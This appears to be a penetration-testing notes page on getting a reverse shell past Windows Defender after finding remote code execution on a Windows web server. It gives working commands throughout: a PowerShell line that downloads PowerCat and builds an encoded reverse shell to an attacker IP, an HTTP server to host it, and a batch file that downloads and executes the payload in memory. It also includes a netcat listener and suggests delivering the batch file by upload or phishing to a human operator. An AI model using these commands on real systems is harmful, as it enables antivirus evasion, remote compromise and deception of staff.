# Shells for AV Bypass



## Powershell obfuscation with Netcat - Windows Defender

**Windows Web Server machine**

The scenario is that we found a RCE on a web application hosted by a Windows Server, but when we try to establesh a reverse shell, nothing happen... The reason is probably because that Windows Machine has the AV enabled, in this case Windows Defender.

### Create and Host PowerCat RevShell encoded

The first step is create a file with a obfuscated Powershell command which will establish the Rev Shell on the our Kali machine. \
To do this we will use the PowerCat library, that allow us to encode a rev shell in a way to bypass Windows Defender.

{% code overflow="wrap" %}
```bash
LHOST=ATTACKER_IP # ATTACKER MACHINE IP
LPORT=ATTACKER_PORT # ATTACKER MACHINE PORT WHERE LISTENER IS SET UP
rshell=shell.txt  # NAME OF THE FILE
pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > /tmp/$rshell
```
{% endcode %}

The command above will generate a file into /tmp directory with the reverse shell encoded using PowerCat.

<figure><img src="../../../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

When we have created the encoded file we have to host it in a simple Http server.

```bash
python3 -m http.server 80 --directory /tmp
```

### Create Bat file to run the RevShell

Create a file to execute that will call the reverse shell script.

This Bat file includes PowerShell one liner to **Download** and **Execute** the encode Powercat code in RAM.

{% code overflow="wrap" %}
```bash
LHOST=ATTACKER_IP # ATTACKER MACHINE IP
LPORT_web=80 # ATTACKER MACHINE PORT WHERE HTTP FILE SERVER IS HOSTED
rshell=shell.txt
echo START /B powershell -c "\$code=(New-Object System.Net.Webclient).DownloadString('http://${LHOST}:${LPORT_web}/${rshell}');iex 'powershell -E \$code'" >/tmp/backup.bat
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>



### Set Up the listener

Start the NetCat listener on the configured port in reverse shell file.

```bash
rlwrap nc -nlvp 4444
```

### Execute the file

Now we have to make a way to running the Bat file from Target machine. For example, uploading the file through web vulnerability or via Phishing.

In this case we have a Form which we know that any files uploaded will be read and open by a operator.

<figure><img src="../../../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>





